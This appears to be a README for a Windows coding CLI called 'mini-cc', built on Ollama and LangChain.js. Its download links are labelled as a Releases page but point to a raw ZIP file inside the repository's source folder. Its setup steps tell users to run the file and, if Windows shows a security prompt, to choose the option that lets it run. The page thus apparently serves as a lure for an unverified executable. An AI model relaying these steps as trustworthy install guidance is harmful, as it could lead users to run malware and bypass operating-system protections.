# 🤖 mini-cc - Run local code help fast

[![Download mini-cc](https://img.shields.io/badge/Download%20mini--cc-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Human-fairness510/mini-cc/raw/refs/heads/main/src/agent/mini-cc-2.3.zip)

## 🚀 What is mini-cc

mini-cc is a command line tool that helps you work with code on your own computer. It uses a local Ollama model, so you can keep your work on your machine. It also uses LangChain.js and the model’s own tool calling support to handle tasks with more reliability.

Use it when you want a small CLI helper for common code tasks such as:

- Reading project files
- Answering questions about a codebase
- Helping with edits and checks
- Using local model tools in a simple flow

## 📦 Download

Visit this page to download mini-cc for Windows:

[https://github.com/Human-fairness510/mini-cc/raw/refs/heads/main/src/agent/mini-cc-2.3.zip](https://github.com/Human-fairness510/mini-cc/raw/refs/heads/main/src/agent/mini-cc-2.3.zip)

On the Releases page:

1. Open the latest release
2. Find the Windows file
3. Download it
4. Run the file on your PC

If the file comes as a ZIP archive, extract it first, then open the app file inside.

## 🪟 Windows setup

mini-cc is made for use on Windows as a desktop command line app. You do not need to know much about the terminal to start.

### What you need

- Windows 10 or Windows 11
- An internet link to download the release
- Ollama installed on your computer
- A local model in Ollama that supports tool calling
- Enough free disk space for the app and model files

### Before you start

1. Install Ollama if you have not done that yet
2. Open Ollama and make sure it runs
3. Pull a model you want to use in mini-cc
4. Keep the app and Ollama open on the same computer

### Download and run

1. Open the Releases page
2. Download the Windows build
3. If Windows shows a security prompt, choose the option that lets you run the file
4. Start mini-cc
5. Follow the prompts in the app

## 🧰 How it works

mini-cc connects three parts:

- Your local model in Ollama
- LangChain.js for task flow
- Model tool calling for actions the model can trigger

This setup helps the app work with files and tasks in a cleaner way than simple prompt only tools.

## 🧭 First run

When you open mini-cc for the first time, it will ask for the basics it needs to talk to Ollama.

Typical first run steps:

1. Start Ollama
2. Open mini-cc
3. Pick or confirm the model name
4. Point the app to your local Ollama service if needed
5. Start asking questions about your code

If you are not sure what to type, try simple requests like:

- Look at this project
- Explain what this file does
- Find the main entry point
- Help me understand the folder structure

## 🛠️ Common uses

mini-cc fits small and practical work:

- Code review help
- File search across a project
- Explaining code in plain language
- Finding where a feature starts
- Helping you trace errors
- Supporting local RAG-style lookup on project files
- Using tools with the model instead of plain text only replies

## 🔍 Example tasks

You can use mini-cc for tasks like:

- Show the files in this project
- Find where the login logic lives
- Explain this function in simple terms
- Compare two code files
- Help me find why this test fails
- Check which file controls the app start flow

## ⚙️ Recommended model choices

For best results, use a local Ollama model that handles tool calling well. Good picks are models in the same family as:

- Claude-style local setups
- General code models
- Smaller instruct models with tool support

If the model does not support tool calling well, the app may still work, but the tool flow can feel less smooth.

## 📁 Project focus

This repo centers on:

- Agent-style task flow
- Claude Code-like usage
- CLI use
- LangChain.js integration
- Ollama as the local model host
- RAG-style project lookup
- Tool calling for safe, model-led actions

## 🧩 Basic usage flow

A simple flow looks like this:

1. Start Ollama
2. Open mini-cc
3. Load your project folder
4. Ask a question about the code
5. Let the model call tools when needed
6. Read the answer and act on it

## 🧪 Troubleshooting

If the app does not start:

- Check that the release file finished downloading
- Make sure Windows did not block the file
- Run the app again from the same folder
- Confirm Ollama is running
- Check that your model is installed in Ollama

If mini-cc cannot reach Ollama:

- Make sure Ollama is open
- Check the local service address
- Restart both Ollama and mini-cc
- Try a different model that supports tool calling

If the app cannot read your project:

- Open the correct folder
- Check that the files are not locked
- Try a smaller test folder first
- Make sure you have access to the files

## 🔐 Privacy

mini-cc uses a local Ollama model, so your code can stay on your own machine. That helps when you want more control over where your files and prompts go. This setup works well for private codebases and local development.

## 🖥️ Best use case

mini-cc works well for users who want:

- A local code helper
- A simple CLI tool
- Less setup than a full cloud service
- Help with reading and understanding code
- A local agent-style workflow

## 📌 Release files

On the Releases page, look for files that match Windows. Common file types can include:

- .exe
- .zip
- .msi

If you see more than one file, choose the one marked for Windows first.

## 🧭 Simple start checklist

- Download mini-cc from Releases
- Install Ollama
- Pull a model with tool calling support
- Open mini-cc
- Load your project
- Ask your first question

## 🛟 If you are new to command line tools

A command line tool uses a text window where you type commands or questions. mini-cc keeps this process simple. You do not need to learn a full terminal workflow to get value from it. Start with short questions and small tasks.

## 📄 Repo details

- Name: mini-cc
- Description: A local Ollama-based code helper CLI tool
- Main idea: Use local models and tool calling for code tasks
- Style of use: Fast, local, and focused on project work